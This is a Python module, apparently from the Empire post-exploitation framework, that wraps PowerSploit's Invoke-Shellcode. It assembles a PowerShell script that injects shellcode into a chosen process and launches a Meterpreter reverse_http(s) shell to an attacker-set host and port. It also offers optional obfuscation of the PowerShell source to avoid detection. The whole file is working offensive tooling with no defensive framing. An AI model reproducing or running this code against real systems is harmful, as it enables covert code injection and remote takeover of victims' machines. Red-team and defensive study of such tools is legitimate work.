import re, os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Shellcode',

            'Author': ['@mattifestation'],

            'Description': ("Uses PowerSploit's Invoke--Shellcode to inject "
                            "shellcode into the process ID of your choosing or "
                            "within the context of the running PowerShell process. If "
                            "you're injecting custom shellcode, make sure it's in the "
                            "correct format and matches the architecture of the process "
                            "you're injecting into."),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'http://www.exploit-monday.com',
                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessID' : {
                'Description'   :   'Process ID of the process you want to inject shellcode into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Meterpreter/Beacon listener name.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Payload' : {
                'Description'   :   'Metasploit payload to inject (reverse_http[s]).',
                'Required'      :   False,
                'Value'         :   'reverse_https'
            },
            'Lhost' : {
                'Description'   :   'Local host handler for the meterpreter shell.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Lport' : {
                'Description'   :   'Local port of the host handler.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Shellcode' : {
                'Description'   :   'Custom shellcode to inject, 0xaa,0xab,... format.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-Shellcode.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "\nInvoke-Shellcode -Force"

        listenerName = self.options['Listener']['Value']
        if listenerName != "":
            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""
            else:
                if self.mainMenu.listeners.is_listener_empire(listenerName):
                    print helpers.color("[!] Meterpreter/Beacon listener required!")
                    return ""

                [ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = self.mainMenu.listeners.get_listener(listenerName)

                MSFpayload = "reverse_http"
                if "https" in host:
                    MSFpayload += "s"

                hostname = host.split(":")[1].strip("/")
                self.options['Lhost']['Value'] = str(hostname)
                self.options['Lport']['Value'] = str(port)
                self.options['Payload']['Value'] = str(MSFpayload)

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "listener":
                if values['Value'] and values['Value'] != '':
                    if option.lower() == "payload":
                        payload = "windows/meterpreter/" + str(values['Value'])
                        script += " -" + str(option) + " " + payload
                    elif option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values['Value'].split("\\"))[1:]
                        script += " -" + str(option) + " @(" + sc + ")"
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        script += "; 'Shellcode injected.'"

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-Shellcode.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/code_execution/Invoke-Shellcode.ps1"
        return os.path.isfile(obfuscatedSource)
